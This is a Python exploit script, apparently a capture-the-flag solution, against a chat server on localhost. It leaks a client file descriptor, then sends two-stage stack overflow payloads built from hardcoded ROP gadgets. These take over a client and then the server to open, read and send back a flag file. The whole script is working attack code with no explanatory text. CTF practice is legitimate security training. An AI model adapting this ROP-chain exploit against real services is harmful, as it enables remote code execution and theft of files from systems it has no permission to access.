#!/usr/bin/env python

from pwnable import *
import time
import random
import string

def MakeRoom(p, name):
    p.Sendline('1')
    p.ReadUntil('>>')
    p.Sendline(name)
    time.sleep(2)
    p.Read(2048)

def JoinRoom(p, name):
    p.Sendline('2')
    p.ReadUntil('>>')
    p.Sendline(name)
    time.sleep(2)
    p.Read(2048)

poprax = [0x0047c267, 0x0047cb47]
poprdi = [0x004006e6, 0x004006e6]
poprsi = [0x00402433, 0x004028e3]
poprdx = [0x004056a6, 0x00405d16]
buf = [0x6d6900, 0x6d6960]
syscall = [0x00406301, 0x00406a51]
flagpath = '/home/chat_server/flag'

xchgedieax = 0x00415015

def MakeRopChain(target, syscall_num ,rdi, rsi, rdx):
    payload = ''
    i = 0 if target == 'c' else 1
    if rdi != None:
        payload += p8(poprdi[i]) + p8(rdi)
    if rsi != None:
        payload += p8(poprsi[i]) + p8(rsi)
    if rdx != None:
        payload += p8(poprdx[i]) + p8(rdx)
    return payload + p8(poprax[i]) + p8(syscall_num) + p8(syscall[i])

HOST = '127.0.0.1'
ROOM_NAME = ''.join(random.choice(string.letters + string.digits) for i in xrange(16))

c1 = Pwnable()
c1.Connect(HOST, 13137)

c2 = Pwnable()
c2.Connect(HOST, 13137)

print('[*] connected!')

c1.ReadUntil('>>')
c2.ReadUntil('>>')

MakeRoom(c1, ROOM_NAME)
JoinRoom(c2, ROOM_NAME)
c1.Sendline('hello')
time.sleep(1)
data = c2.Read(2048)
c1fd = int(data.split(':')[0][len('Remote'):])
print('[*] client1 fd = {}'.format(c1fd))

# stage1
bbs = buf[0]
payload = 'a'*256 + 'b'*7 + 'c'*8 # buf size, rest stack space, sfp
payload += MakeRopChain('c', 0, 0, bbs, 2052)
payload += MakeRopChain('c', 1, 3, bbs, 2052)
payload += MakeRopChain('c', 0, 0, bbs, 8) # read len + 0xdeadf00d from client
payload += MakeRopChain('c', 1, 3, bbs, 8) # send len + 0xdeadf00d
payload += MakeRopChain('c', 0, 3, bbs, 2048) # read flag from server
payload += MakeRopChain('c', 1, 1, bbs, 2048) # write flag to client

c2.Sendline(payload)
time.sleep(1)
c1.Read(2048)
time.sleep(1)
c1.Sendline('/bye')
print('[*] exploit client!!!')


# stage2
bbs = buf[1]
payload = flagpath + '\x00' + 'a'*(1024 - len(flagpath) - 1) + 'b'*128 + 'c'*8 # buf size, name size, sfp
payload += MakeRopChain('s', 2, bbs, 0, None) # open flag
payload += p8(xchgedieax) # move flag fd to edi
payload += MakeRopChain('s', 0, None, bbs, 2048) # read flag
payload += MakeRopChain('s', 1, c1fd, bbs, 2048) # write to the client
payload += 'a' * (2048 - len(payload))

time.sleep(1)
c1.Send(p4(len(payload)) + payload)
time.sleep(1)
c1.Send('\x04\x00\x00\x00\xde\xad\xf0\x0d') # trigger server BOF
c2.Sendline('/bye') # if c2 send '/bye' before the c1 send the magic number. then, sema was destroyed
print('[*] exploit server!!!')
time.sleep(1)
print('[*] flag = {}'.format(c1.Read(2048).split('\n')[0]))
